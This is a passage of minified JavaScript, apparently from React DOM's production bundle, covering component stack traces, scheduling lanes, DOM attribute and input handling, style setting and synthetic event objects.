                                    var v = g
                                }
                                Reflect.construct(l, [], x)
                            } else {
                                try {
                                    x.call()
                                } catch (g) {
                                    v = g
                                }
                                l.call(x.prototype)
                            }
                        } else {
                            try {
                                throw Error()
                            } catch (g) {
                                v = g
                            }
                            (x = l()) && typeof x.catch == "function" && x.catch(function() {})
                        }
                    } catch (g) {
                        if (g && v && typeof g.stack == "string")
                            return [g.stack, v.stack]
                    }
                    return [null, null]
                }
            };
            a.DetermineComponentFrameRoot.displayName = "DetermineComponentFrameRoot";
            var u = Object.getOwnPropertyDescriptor(a.DetermineComponentFrameRoot, "name");
            u && u.configurable && Object.defineProperty(a.DetermineComponentFrameRoot, "name", {
                value: "DetermineComponentFrameRoot"
            });
            var n = a.DetermineComponentFrameRoot()
              , i = n[0]
              , c = n[1];
            if (i && c) {
                var s = i.split(`
`)
                  , y = c.split(`
`);
                for (u = a = 0; a < s.length && !s[a].includes("DetermineComponentFrameRoot"); )
                    a++;
                for (; u < y.length && !y[u].includes("DetermineComponentFrameRoot"); )
                    u++;
                if (a === s.length || u === y.length)
                    for (a = s.length - 1,
                    u = y.length - 1; 1 <= a && 0 <= u && s[a] !== y[u]; )
                        u--;
                for (; 1 <= a && 0 <= u; a--,
                u--)
                    if (s[a] !== y[u]) {
                        if (a !== 1 || u !== 1)
                            do
                                if (a--,
                                u--,
                                0 > u || s[a] !== y[u]) {
                                    var S = `
` + s[a].replace(" at new ", " at ");
                                    return l.displayName && S.includes("<anonymous>") && (S = S.replace("<anonymous>", l.displayName)),
                                    S
                                }
                            while (1 <= a && 0 <= u);
                        break
                    }
            }
        } finally {
            Vn = !1,
            Error.prepareStackTrace = e
        }
        return (e = l ? l.displayName || l.name : "") ? Me(e) : ""
    }
    function Rr(l, t) {
        switch (l.tag) {
        case 26:
        case 27:
        case 5:
            return Me(l.type);
        case 16:
            return Me("Lazy");
        case 13:
            return l.child !== t && t !== null ? Me("Suspense Fallback") : Me("Suspense");
        case 19:
            return Me("SuspenseList");
        case 0:
        case 15:
            return Kn(l.type, !1);
        case 11:
            return Kn(l.type.render, !1);
        case 1:
            return Kn(l.type, !0);
        case 31:
            return Me("Activity");
        default:
            return ""
        }
    }
    function vf(l) {
        try {
            var t = ""
              , e = null;
            do
                t += Rr(l, e),
                e = l,
                l = l.return;
            while (l);
            return t
        } catch (a) {
            return `
Error generating stack: ` + a.message + `
` + a.stack
        }
    }
    var Jn = Object.prototype.hasOwnProperty
      , wn = T.unstable_scheduleCallback
      , Wn = T.unstable_cancelCallback
      , Cr = T.unstable_shouldYield
      , Hr = T.unstable_requestPaint
      , et = T.unstable_now
      , Br = T.unstable_getCurrentPriorityLevel
      , gf = T.unstable_ImmediatePriority
      , Sf = T.unstable_UserBlockingPriority
      , Mu = T.unstable_NormalPriority
      , qr = T.unstable_LowPriority
      , pf = T.unstable_IdlePriority
      , Yr = T.log
      , Gr = T.unstable_setDisableYieldValue
      , Na = null
      , at = null;
    function le(l) {
        if (typeof Yr == "function" && Gr(l),
        at && typeof at.setStrictMode == "function")
            try {
                at.setStrictMode(Na, l)
            } catch {}
    }
    var ut = Math.clz32 ? Math.clz32 : Lr
      , Xr = Math.log
      , Qr = Math.LN2;
    function Lr(l) {
        return l >>>= 0,
        l === 0 ? 32 : 31 - (Xr(l) / Qr | 0) | 0
    }
    var ju = 256
      , _u = 262144
      , Ou = 4194304;
    function je(l) {
        var t = l & 42;
        if (t !== 0)
            return t;
        switch (l & -l) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
            return 64;
        case 128:
            return 128;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
            return l & 261888;
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return l & 3932160;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            return l & 62914560;
        case 67108864:
            return 67108864;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 0;
        default:
            return l
        }
    }
    function Du(l, t, e) {
        var a = l.pendingLanes;
        if (a === 0)
            return 0;
        var u = 0
          , n = l.suspendedLanes
          , i = l.pingedLanes;
        l = l.warmLanes;
        var c = a & 134217727;
        return c !== 0 ? (a = c & ~n,
        a !== 0 ? u = je(a) : (i &= c,
        i !== 0 ? u = je(i) : e || (e = c & ~l,
        e !== 0 && (u = je(e))))) : (c = a & ~n,
        c !== 0 ? u = je(c) : i !== 0 ? u = je(i) : e || (e = a & ~l,
        e !== 0 && (u = je(e)))),
        u === 0 ? 0 : t !== 0 && t !== u && (t & n) === 0 && (n = u & -u,
        e = t & -t,
        n >= e || n === 32 && (e & 4194048) !== 0) ? t : u
    }
    function Ua(l, t) {
        return (l.pendingLanes & ~(l.suspendedLanes & ~l.pingedLanes) & t) === 0
    }
    function Zr(l, t) {
        switch (l) {
        case 1:
        case 2:
        case 4:
        case 8:
        case 64:
            return t + 250;
        case 16:
        case 32:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return t + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            return -1;
        case 67108864:
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
            return -1;
        default:
            return -1
        }
    }
    function bf() {
        var l = Ou;
        return Ou <<= 1,
        (Ou & 62914560) === 0 && (Ou = 4194304),
        l
    }
    function kn(l) {
        for (var t = [], e = 0; 31 > e; e++)
            t.push(l);
        return t
    }
    function Ra(l, t) {
        l.pendingLanes |= t,
        t !== 268435456 && (l.suspendedLanes = 0,
        l.pingedLanes = 0,
        l.warmLanes = 0)
    }
    function Vr(l, t, e, a, u, n) {
        var i = l.pendingLanes;
        l.pendingLanes = e,
        l.suspendedLanes = 0,
        l.pingedLanes = 0,
        l.warmLanes = 0,
        l.expiredLanes &= e,
        l.entangledLanes &= e,
        l.errorRecoveryDisabledLanes &= e,
        l.shellSuspendCounter = 0;
        var c = l.entanglements
          , s = l.expirationTimes
          , y = l.hiddenUpdates;
        for (e = i & ~e; 0 < e; ) {
            var S = 31 - ut(e)
              , x = 1 << S;
            c[S] = 0,
            s[S] = -1;
            var v = y[S];
            if (v !== null)
                for (y[S] = null,
                S = 0; S < v.length; S++) {
                    var g = v[S];
                    g !== null && (g.lane &= -536870913)
                }
            e &= ~x
        }
        a !== 0 && xf(l, a, 0),
        n !== 0 && u === 0 && l.tag !== 0 && (l.suspendedLanes |= n & ~(i & ~t))
    }
    function xf(l, t, e) {
        l.pendingLanes |= t,
        l.suspendedLanes &= ~t;
        var a = 31 - ut(t);
        l.entangledLanes |= t,
        l.entanglements[a] = l.entanglements[a] | 1073741824 | e & 261930
    }
    function zf(l, t) {
        var e = l.entangledLanes |= t;
        for (l = l.entanglements; e; ) {
            var a = 31 - ut(e)
              , u = 1 << a;
            u & t | l[a] & t && (l[a] |= t),
            e &= ~u
        }
    }
    function Ef(l, t) {
        var e = t & -t;
        return e = (e & 42) !== 0 ? 1 : $n(e),
        (e & (l.suspendedLanes | t)) !== 0 ? 0 : e
    }
    function $n(l) {
        switch (l) {
        case 2:
            l = 1;
            break;
        case 8:
            l = 4;
            break;
        case 32:
            l = 16;
            break;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            l = 128;
            break;
        case 268435456:
            l = 134217728;
            break;
        default:
            l = 0
        }
        return l
    }
    function Fn(l) {
        return l &= -l,
        2 < l ? 8 < l ? (l & 134217727) !== 0 ? 32 : 268435456 : 8 : 2
    }
    function Tf() {
        var l = A.p;
        return l !== 0 ? l : (l = window.event,
        l === void 0 ? 32 : or(l.type))
    }
    function Af(l, t) {
        var e = A.p;
        try {
            return A.p = l,
            t()
        } finally {
            A.p = e
        }
    }
    var te = Math.random().toString(36).slice(2)
      , Rl = "__reactFiber$" + te
      , wl = "__reactProps$" + te
      , we = "__reactContainer$" + te
      , In = "__reactEvents$" + te
      , Kr = "__reactListeners$" + te
      , Jr = "__reactHandles$" + te
      , Mf = "__reactResources$" + te
      , Ca = "__reactMarker$" + te;
    function Pn(l) {
        delete l[Rl],
        delete l[wl],
        delete l[In],
        delete l[Kr],
        delete l[Jr]
    }
    function We(l) {
        var t = l[Rl];
        if (t)
            return t;
        for (var e = l.parentNode; e; ) {
            if (t = e[we] || e[Rl]) {
                if (e = t.alternate,
                t.child !== null || e !== null && e.child !== null)
                    for (l = Wd(l); l !== null; ) {
                        if (e = l[Rl])
                            return e;
                        l = Wd(l)
                    }
                return t
            }
            l = e,
            e = l.parentNode
        }
        return null
    }
    function ke(l) {
        if (l = l[Rl] || l[we]) {
            var t = l.tag;
            if (t === 5 || t === 6 || t === 13 || t === 31 || t === 26 || t === 27 || t === 3)
                return l
        }
        return null
    }
    function Ha(l) {
        var t = l.tag;
        if (t === 5 || t === 26 || t === 27 || t === 6)
            return l.stateNode;
        throw Error(r(33))
    }
    function $e(l) {
        var t = l[Mf];
        return t || (t = l[Mf] = {
            hoistableStyles: new Map,
            hoistableScripts: new Map
        }),
        t
    }
    function _l(l) {
        l[Ca] = !0
    }
    var jf = new Set
      , _f = {};
    function _e(l, t) {
        Fe(l, t),
        Fe(l + "Capture", t)
    }
    function Fe(l, t) {
        for (_f[l] = t,
        l = 0; l < t.length; l++)
            jf.add(t[l])
    }
    var wr = RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$")
      , Of = {}
      , Df = {};
    function Wr(l) {
        return Jn.call(Df, l) ? !0 : Jn.call(Of, l) ? !1 : wr.test(l) ? Df[l] = !0 : (Of[l] = !0,
        !1)
    }
    function Nu(l, t, e) {
        if (Wr(t))
            if (e === null)
                l.removeAttribute(t);
            else {
                switch (typeof e) {
                case "undefined":
                case "function":
                case "symbol":
                    l.removeAttribute(t);
                    return;
                case "boolean":
                    var a = t.toLowerCase().slice(0, 5);
                    if (a !== "data-" && a !== "aria-") {
                        l.removeAttribute(t);
                        return
                    }
                }
                l.setAttribute(t, "" + e)
            }
    }
    function Uu(l, t, e) {
        if (e === null)
            l.removeAttribute(t);
        else {
            switch (typeof e) {
            case "undefined":
            case "function":
            case "symbol":
            case "boolean":
                l.removeAttribute(t);
                return
            }
            l.setAttribute(t, "" + e)
        }
    }
    function Bt(l, t, e, a) {
        if (a === null)
            l.removeAttribute(e);
        else {
            switch (typeof a) {
            case "undefined":
            case "function":
            case "symbol":
            case "boolean":
                l.removeAttribute(e);
                return
            }
            l.setAttributeNS(t, e, "" + a)
        }
    }
    function ht(l) {
        switch (typeof l) {
        case "bigint":
        case "boolean":
        case "number":
        case "string":
        case "undefined":
            return l;
        case "object":
            return l;
        default:
            return ""
        }
    }
    function Nf(l) {
        var t = l.type;
        return (l = l.nodeName) && l.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
    }
    function kr(l, t, e) {
        var a = Object.getOwnPropertyDescriptor(l.constructor.prototype, t);
        if (!l.hasOwnProperty(t) && typeof a < "u" && typeof a.get == "function" && typeof a.set == "function") {
            var u = a.get
              , n = a.set;
            return Object.defineProperty(l, t, {
                configurable: !0,
                get: function() {
                    return u.call(this)
                },
                set: function(i) {
                    e = "" + i,
                    n.call(this, i)
                }
            }),
            Object.defineProperty(l, t, {
                enumerable: a.enumerable
            }),
            {
                getValue: function() {
                    return e
                },
                setValue: function(i) {
                    e = "" + i
                },
                stopTracking: function() {
                    l._valueTracker = null,
                    delete l[t]
                }
            }
        }
    }
    function li(l) {
        if (!l._valueTracker) {
            var t = Nf(l) ? "checked" : "value";
            l._valueTracker = kr(l, t, "" + l[t])
        }
    }
    function Uf(l) {
        if (!l)
            return !1;
        var t = l._valueTracker;
        if (!t)
            return !0;
        var e = t.getValue()
          , a = "";
        return l && (a = Nf(l) ? l.checked ? "true" : "false" : l.value),
        l = a,
        l !== e ? (t.setValue(l),
        !0) : !1
    }
    function Ru(l) {
        if (l = l || (typeof document < "u" ? document : void 0),
        typeof l > "u")
            return null;
        try {
            return l.activeElement || l.body
        } catch {
            return l.body
        }
    }
    var $r = /[\n"\\]/g;
    function yt(l) {
        return l.replace($r, function(t) {
            return "\\" + t.charCodeAt(0).toString(16) + " "
        })
    }
    function ti(l, t, e, a, u, n, i, c) {
        l.name = "",
        i != null && typeof i != "function" && typeof i != "symbol" && typeof i != "boolean" ? l.type = i : l.removeAttribute("type"),
        t != null ? i === "number" ? (t === 0 && l.value === "" || l.value != t) && (l.value = "" + ht(t)) : l.value !== "" + ht(t) && (l.value = "" + ht(t)) : i !== "submit" && i !== "reset" || l.removeAttribute("value"),
        t != null ? ei(l, i, ht(t)) : e != null ? ei(l, i, ht(e)) : a != null && l.removeAttribute("value"),
        u == null && n != null && (l.defaultChecked = !!n),
        u != null && (l.checked = u && typeof u != "function" && typeof u != "symbol"),
        c != null && typeof c != "function" && typeof c != "symbol" && typeof c != "boolean" ? l.name = "" + ht(c) : l.removeAttribute("name")
    }
    function Rf(l, t, e, a, u, n, i, c) {
        if (n != null && typeof n != "function" && typeof n != "symbol" && typeof n != "boolean" && (l.type = n),
        t != null || e != null) {
            if (!(n !== "submit" && n !== "reset" || t != null)) {
                li(l);
                return
            }
            e = e != null ? "" + ht(e) : "",
            t = t != null ? "" + ht(t) : e,
            c || t === l.value || (l.value = t),
            l.defaultValue = t
        }
        a = a ?? u,
        a = typeof a != "function" && typeof a != "symbol" && !!a,
        l.checked = c ? l.checked : !!a,
        l.defaultChecked = !!a,
        i != null && typeof i != "function" && typeof i != "symbol" && typeof i != "boolean" && (l.name = i),
        li(l)
    }
    function ei(l, t, e) {
        t === "number" && Ru(l.ownerDocument) === l || l.defaultValue === "" + e || (l.defaultValue = "" + e)
    }
    function Ie(l, t, e, a) {
        if (l = l.options,
        t) {
            t = {};
            for (var u = 0; u < e.length; u++)
                t["$" + e[u]] = !0;
            for (e = 0; e < l.length; e++)
                u = t.hasOwnProperty("$" + l[e].value),
                l[e].selected !== u && (l[e].selected = u),
                u && a && (l[e].defaultSelected = !0)
        } else {
            for (e = "" + ht(e),
            t = null,
            u = 0; u < l.length; u++) {
                if (l[u].value === e) {
                    l[u].selected = !0,
                    a && (l[u].defaultSelected = !0);
                    return
                }
                t !== null || l[u].disabled || (t = l[u])
            }
            t !== null && (t.selected = !0)
        }
    }
    function Cf(l, t, e) {
        if (t != null && (t = "" + ht(t),
        t !== l.value && (l.value = t),
        e == null)) {
            l.defaultValue !== t && (l.defaultValue = t);
            return
        }
        l.defaultValue = e != null ? "" + ht(e) : ""
    }
    function Hf(l, t, e, a) {
        if (t == null) {
            if (a != null) {
                if (e != null)
                    throw Error(r(92));
                if (tt(a)) {
                    if (1 < a.length)
                        throw Error(r(93));
                    a = a[0]
                }
                e = a
            }
            e == null && (e = ""),
            t = e
        }
        e = ht(t),
        l.defaultValue = e,
        a = l.textContent,
        a === e && a !== "" && a !== null && (l.value = a),
        li(l)
    }
    function Pe(l, t) {
        if (t) {
            var e = l.firstChild;
            if (e && e === l.lastChild && e.nodeType === 3) {
                e.nodeValue = t;
                return
            }
        }
        l.textContent = t
    }
    var Fr = new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));
    function Bf(l, t, e) {
        var a = t.indexOf("--") === 0;
        e == null || typeof e == "boolean" || e === "" ? a ? l.setProperty(t, "") : t === "float" ? l.cssFloat = "" : l[t] = "" : a ? l.setProperty(t, e) : typeof e != "number" || e === 0 || Fr.has(t) ? t === "float" ? l.cssFloat = e : l[t] = ("" + e).trim() : l[t] = e + "px"
    }
    function qf(l, t, e) {
        if (t != null && typeof t != "object")
            throw Error(r(62));
        if (l = l.style,
        e != null) {
            for (var a in e)
                !e.hasOwnProperty(a) || t != null && t.hasOwnProperty(a) || (a.indexOf("--") === 0 ? l.setProperty(a, "") : a === "float" ? l.cssFloat = "" : l[a] = "");
            for (var u in t)
                a = t[u],
                t.hasOwnProperty(u) && e[u] !== a && Bf(l, u, a)
        } else
            for (var n in t)
                t.hasOwnProperty(n) && Bf(l, n, t[n])
    }
    function ai(l) {
        if (l.indexOf("-") === -1)
            return !1;
        switch (l) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0
        }
    }
    var Ir = new Map([["acceptCharset", "accept-charset"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"], ["crossOrigin", "crossorigin"], ["accentHeight", "accent-height"], ["alignmentBaseline", "alignment-baseline"], ["arabicForm", "arabic-form"], ["baselineShift", "baseline-shift"], ["capHeight", "cap-height"], ["clipPath", "clip-path"], ["clipRule", "clip-rule"], ["colorInterpolation", "color-interpolation"], ["colorInterpolationFilters", "color-interpolation-filters"], ["colorProfile", "color-profile"], ["colorRendering", "color-rendering"], ["dominantBaseline", "dominant-baseline"], ["enableBackground", "enable-background"], ["fillOpacity", "fill-opacity"], ["fillRule", "fill-rule"], ["floodColor", "flood-color"], ["floodOpacity", "flood-opacity"], ["fontFamily", "font-family"], ["fontSize", "font-size"], ["fontSizeAdjust", "font-size-adjust"], ["fontStretch", "font-stretch"], ["fontStyle", "font-style"], ["fontVariant", "font-variant"], ["fontWeight", "font-weight"], ["glyphName", "glyph-name"], ["glyphOrientationHorizontal", "glyph-orientation-horizontal"], ["glyphOrientationVertical", "glyph-orientation-vertical"], ["horizAdvX", "horiz-adv-x"], ["horizOriginX", "horiz-origin-x"], ["imageRendering", "image-rendering"], ["letterSpacing", "letter-spacing"], ["lightingColor", "lighting-color"], ["markerEnd", "marker-end"], ["markerMid", "marker-mid"], ["markerStart", "marker-start"], ["overlinePosition", "overline-position"], ["overlineThickness", "overline-thickness"], ["paintOrder", "paint-order"], ["panose-1", "panose-1"], ["pointerEvents", "pointer-events"], ["renderingIntent", "rendering-intent"], ["shapeRendering", "shape-rendering"], ["stopColor", "stop-color"], ["stopOpacity", "stop-opacity"], ["strikethroughPosition", "strikethrough-position"], ["strikethroughThickness", "strikethrough-thickness"], ["strokeDasharray", "stroke-dasharray"], ["strokeDashoffset", "stroke-dashoffset"], ["strokeLinecap", "stroke-linecap"], ["strokeLinejoin", "stroke-linejoin"], ["strokeMiterlimit", "stroke-miterlimit"], ["strokeOpacity", "stroke-opacity"], ["strokeWidth", "stroke-width"], ["textAnchor", "text-anchor"], ["textDecoration", "text-decoration"], ["textRendering", "text-rendering"], ["transformOrigin", "transform-origin"], ["underlinePosition", "underline-position"], ["underlineThickness", "underline-thickness"], ["unicodeBidi", "unicode-bidi"], ["unicodeRange", "unicode-range"], ["unitsPerEm", "units-per-em"], ["vAlphabetic", "v-alphabetic"], ["vHanging", "v-hanging"], ["vIdeographic", "v-ideographic"], ["vMathematical", "v-mathematical"], ["vectorEffect", "vector-effect"], ["vertAdvY", "vert-adv-y"], ["vertOriginX", "vert-origin-x"], ["vertOriginY", "vert-origin-y"], ["wordSpacing", "word-spacing"], ["writingMode", "writing-mode"], ["xmlnsXlink", "xmlns:xlink"], ["xHeight", "x-height"]])
      , Pr = /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
    function Cu(l) {
        return Pr.test("" + l) ? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')" : l
    }
    function qt() {}
    var ui = null;
    function ni(l) {
        return l = l.target || l.srcElement || window,
        l.correspondingUseElement && (l = l.correspondingUseElement),
        l.nodeType === 3 ? l.parentNode : l
    }
    var la = null
      , ta = null;
    function Yf(l) {
        var t = ke(l);
        if (t && (l = t.stateNode)) {
            var e = l[wl] || null;
            l: switch (l = t.stateNode,
            t.type) {
            case "input":
                if (ti(l, e.value, e.defaultValue, e.defaultValue, e.checked, e.defaultChecked, e.type, e.name),
                t = e.name,
                e.type === "radio" && t != null) {
                    for (e = l; e.parentNode; )
                        e = e.parentNode;
                    for (e = e.querySelectorAll('input[name="' + yt("" + t) + '"][type="radio"]'),
                    t = 0; t < e.length; t++) {
                        var a = e[t];
                        if (a !== l && a.form === l.form) {
                            var u = a[wl] || null;
                            if (!u)
                                throw Error(r(90));
                            ti(a, u.value, u.defaultValue, u.defaultValue, u.checked, u.defaultChecked, u.type, u.name)
                        }
                    }
                    for (t = 0; t < e.length; t++)
                        a = e[t],
                        a.form === l.form && Uf(a)
                }
                break l;
            case "textarea":
                Cf(l, e.value, e.defaultValue);
                break l;
            case "select":
                t = e.value,
                t != null && Ie(l, !!e.multiple, t, !1)
            }
        }
    }
    var ii = !1;
    function Gf(l, t, e) {
        if (ii)
            return l(t, e);
        ii = !0;
        try {
            var a = l(t);
            return a
        } finally {
            if (ii = !1,
            (la !== null || ta !== null) && (zn(),
            la && (t = la,
            l = ta,
            ta = la = null,
            Yf(t),
            l)))
                for (t = 0; t < l.length; t++)
                    Yf(l[t])
        }
    }
    function Ba(l, t) {
        var e = l.stateNode;
        if (e === null)
            return null;
        var a = e[wl] || null;
        if (a === null)
            return null;
        e = a[t];
        l: switch (t) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
            (a = !a.disabled) || (l = l.type,
            a = !(l === "button" || l === "input" || l === "select" || l === "textarea")),
            l = !a;
            break l;
        default:
            l = !1
        }
        if (l)
            return null;
        if (e && typeof e != "function")
            throw Error(r(231, t, typeof e));
        return e
    }
    var Yt = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u")
      , ci = !1;
    if (Yt)
        try {
            var qa = {};
            Object.defineProperty(qa, "passive", {
                get: function() {
                    ci = !0
                }
            }),
            window.addEventListener("test", qa, qa),
            window.removeEventListener("test", qa, qa)
        } catch {
            ci = !1
        }
    var ee = null
      , fi = null
      , Hu = null;
    function Xf() {
        if (Hu)
            return Hu;
        var l, t = fi, e = t.length, a, u = "value"in ee ? ee.value : ee.textContent, n = u.length;
        for (l = 0; l < e && t[l] === u[l]; l++)
            ;
        var i = e - l;
        for (a = 1; a <= i && t[e - a] === u[n - a]; a++)
            ;
        return Hu = u.slice(l, 1 < a ? 1 - a : void 0)
    }
    function Bu(l) {
        var t = l.keyCode;
        return "charCode"in l ? (l = l.charCode,
        l === 0 && t === 13 && (l = 13)) : l = t,
        l === 10 && (l = 13),
        32 <= l || l === 13 ? l : 0
    }
    function qu() {
        return !0
    }
    function Qf() {
        return !1
    }
    function Wl(l) {
        function t(e, a, u, n, i) {
            this._reactName = e,
            this._targetInst = u,
            this.type = a,
            this.nativeEvent = n,
            this.target = i,
            this.currentTarget = null;
            for (var c in l)
                l.hasOwnProperty(c) && (e = l[c],
                this[c] = e ? e(n) : n[c]);
            return this.isDefaultPrevented = (n.defaultPrevented != null ? n.defaultPrevented : n.returnValue === !1) ? qu : Qf,
            this.isPropagationStopped = Qf,
            this
        }
        return U(t.prototype, {
            preventDefault: function() {
                this.defaultPrevented = !0;
                var e = this.nativeEvent;
                e && (e.preventDefault ? e.preventDefault() : typeof e.returnValue != "unknown" && (e.returnValue = !1),
                this.isDefaultPrevented = qu)
            },
            stopPropagation: function() {
                var e = this.nativeEvent;
                e && (e.stopPropagation ? e.stopPropagation() : typeof e.cancelBubble != "unknown" && (e.cancelBubble = !0),
                this.isPropagationStopped = qu)
            },
            persist: function() {},
            isPersistent: qu
        }),
        t
    }
    var Oe = {
        eventPhase: 0,
        bubbles: 0,
        cancelable: 0,
        timeStamp: function(l) {
            return l.timeStamp || Date.now()
        },
        defaultPrevented: 0,
        isTrusted: 0
    }, Yu = Wl(Oe), Ya = U({}, Oe, {
        view: 0,
        detail: 0
    }), l0 = Wl(Ya), si, oi, Ga, Gu = U({}, Ya, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: ri,
        button: 0,
        buttons: 0,
        relatedTarget: function(l) {
            return l.relatedTarget === void 0 ? l.fromElement === l.srcElement ? l.toElement : l.fromElement : l.relatedTarget
        },
        movementX: function(l) {
            return "movementX"in l ? l.movementX : (l !== Ga && (Ga && l.type === "mousemove" ? (si = l.screenX - Ga.screenX,
            oi = l.screenY - Ga.screenY) : oi = si = 0,
            Ga = l),
            si)
        },
        movementY: function(l) {
            return "movementY"in l ? l.movementY : oi
        }
    }), Lf = Wl(Gu), t0 = U({}, Gu, {
        dataTransfer: 0
    }), e0 = Wl(t0), a0 = U({}, Ya, {
        relatedTarget: 0
    }), di = Wl(a0), u0 = U({}, Oe, {
        animationName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }), n0 = Wl(u0), i0 = U({}, Oe, {
        clipboardData: function(l) {
            return "clipboardData"in l ? l.clipboardData : window.clipboardData
        }
    }), c0 = Wl(i0), f0 = U({}, Oe, {
        data: 0
    }), Zf = Wl(f0), s0 = {
        Esc: "Escape",
        Spacebar: " ",
        Left: "ArrowLeft",
        Up: "ArrowUp",
        Right: "ArrowRight",
        Down: "ArrowDown",
        Del: "Delete",
        Win: "OS",
        Menu: "ContextMenu",
        Apps: "ContextMenu",
        Scroll: "ScrollLock",
        MozPrintableKey: "Unidentified"
    }, o0 = {
        8: "Backspace",
        9: "Tab",
        12: "Clear",
        13: "Enter",
        16: "Shift",
        17: "Control",
        18: "Alt",
        19: "Pause",
        20: "CapsLock",
        27: "Escape",
        32: " ",
        33: "PageUp",
        34: "PageDown",
        35: "End",
        36: "Home",
        37: "ArrowLeft",
        38: "ArrowUp",
        39: "ArrowRight",
        40: "ArrowDown",
        45: "Insert",
        46: "Delete",
        112: "F1",
        113: "F2",
        114: "F3",
        115: "F4",
        116: "F5",
        117: "F6",
        118: "F7",
        119: "F8",
        120: "F9",
        121: "F10",
        122: "F11",
        123: "F12",
        144: "NumLock",
        145: "ScrollLock",
        224: "Meta"
    }, d0 = {
        Alt: "altKey",
        Control: "ctrlKey",
        Meta: "metaKey",
        Shift: "shiftKey"
    };
    function r0(l) {
        var t = this.nativeEvent;
        return t.getModifierState ? t.getModifierState(l) : (l = d0[l]) ? !!t[l] : !1
    }
    function ri() {
        return r0
    }
    var m0 = U({}, Ya, {
        key: function(l) {
            if (l.key) {
                var t = s0[l.key] || l.key;
                if (t !== "Unidentified")
                    return t
            }
            return l.type === "keypress" ? (l = Bu(l),
            l === 13 ? "Enter" : String.fromCharCode(l)) : l.type === "keydown" || l.type === "keyup" ? o0[l.keyCode] || "Unidentified" : ""
        },
        code: 0,
        location: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        repeat: 0,
        locale: 0,
        getModifierState: ri,
        charCode: function(l) {
            return l.type === "keypress" ? Bu(l) : 0
        },
        keyCode: function(l) {
            return l.type === "keydown" || l.type === "keyup" ? l.keyCode : 0
        },
        which: function(l) {
            return l.type === "keypress" ? Bu(l) : l.type === "keydown" || l.type === "keyup" ? l.keyCode : 0
        }
    })
      , h0 = Wl(m0)
      , y0 = U({}, Gu, {
        pointerId: 0,
        width: 0,
        height: 0,
        pressure: 0,
        tangentialPressure: 0,
        tiltX: 0,
        tiltY: 0,
        twist: 0,
        pointerType: 0,
        isPrimary: 0
    })
      , Vf = Wl(y0)
      , v0 = U({}, Ya, {
        touches: 0,
        targetTouches: 0,
        changedTouches: 0,
        altKey: 0,
        metaKey: 0,
        ctrlKey: 0,
        shiftKey: 0,
        getModifierState: ri
    })
      , g0 = Wl(v0)
      , S0 = U({}, Oe, {
        propertyName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    })
      , p0 = Wl(S0)
      , b0 = U({}, Gu, {
